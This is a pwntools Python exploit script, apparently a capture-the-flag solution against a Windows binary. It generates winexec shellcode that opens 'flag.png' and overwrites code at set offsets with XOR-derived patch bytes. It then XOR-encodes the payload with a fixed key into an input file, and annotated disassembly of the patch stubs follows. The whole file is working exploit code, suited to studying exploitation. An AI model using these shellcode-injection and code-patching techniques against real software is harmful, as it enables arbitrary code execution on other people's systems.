from pwn import *

context.update(arch='amd64', os='windows')

code_B518 = [u64(b'\x48\x89\x5C\x24\x08\x57\x48\x83'), u64(b'\xEC\x20\x48\x8B\xD9\xE8\xA2\xFF')]
code_14000 = [u64(b'\x00\x00\xE8\x41\x49\xFF\xFF\xE9'), u64(b'\x2C\x03\x00\x00\x4D\x85\xF6\x74')]
code_15000 = [u64(b'\x44\x38\x7D\xDF\x74\x42\x48\x8B'), u64(b'\x45\xC7\x83\xA0\xA8\x03\x00\x00')]

key_a = [0x55d94400024d7a77, 0x307b995159a267aa]
key_13 = [0x35fc682a047d56fd, 0x0de569f03cf28188]
key_14 = [0x229694c0675a4a33, 0x09ed7ebd74bca632]

newcode_B518 = [u64(b'\x68\x08\x00\x01\x00\x5A\x6A\x40'), u64(b'\x41\x58\xE9\xD9\x8A\x00\x00\xCC')]
newcode_14000 = [u64(b'\x48\x8D\x0D\xC1\x2B\x01\x00\x51'), u64(b'\x41\x59\xE9\xF1\x0F\x00\x00\xCC')]
newcode_15000 = [u64(b'\x48\x8D\x59\x08\xFF\x15\x6E\x51'), u64(b'\x00\x00\xFF\xE3\xCC\xCC\xCC\xCC')]

shellcode = asm(shellcraft.amd64.windows.winexec(b'cmd /C "start flag.png"'))
payload = shellcode.ljust(0x10000, b'\xCC')
payload += p64(0) * 3 * 0xa
payload += p64(code_B518[1] ^ newcode_B518[1] ^ key_a[1]) + p64(code_B518[0] ^ newcode_B518[0] ^ key_a[0]) + p64(1)
payload += p64(0) * 3 * 8
payload += p64(code_14000[0] ^ newcode_14000[0] ^ key_13[0]) + p64(code_14000[1] ^ newcode_14000[1] ^ key_13[1]) + p64(1)
payload += p64(code_15000[0] ^ newcode_15000[0] ^ key_14[0]) + p64(code_15000[1] ^ newcode_15000[1] ^ key_14[1]) + p64(1)

key = b'PJSK'
encoded_payload = b''

for i in range(len(payload)):
    encoded_payload += bytes([payload[i] ^ key[i % len(key)]])

with open('data.txt', 'wb') as f:
    f.write(encoded_payload)

#    0:   68 08 00 01 00          push   0x10008
#    5:   5a                      pop    rdx
#    6:   6a 40                   push   0x40
#    8:   41 58                   pop    r8
#    a:   e9 d9 8a 00 00          jmp    0x8ad9
#    f:   cc                      int3
#    0:   48 8d 0d c1 2b 01 00    lea    rcx, [rip+0x12bc1]        # 0x12bc8
#    7:   51                      push   rcx
#    8:   41 59                   pop    r9
#    a:   e9 f1 0f 00 00          jmp    0x1000
#    f:   cc                      int3
#    0:   48 8d 59 08             lea    rbx, [rcx+0x8]
#    4:   ff 15 6e 51 00 00       call   QWORD PTR [rip+0x516e]        # 0x5178
#    a:   ff e3                   jmp    rbx
#    c:   cc                      int3
#    d:   cc                      int3
#    e:   cc                      int3
#    f:   cc                      int3
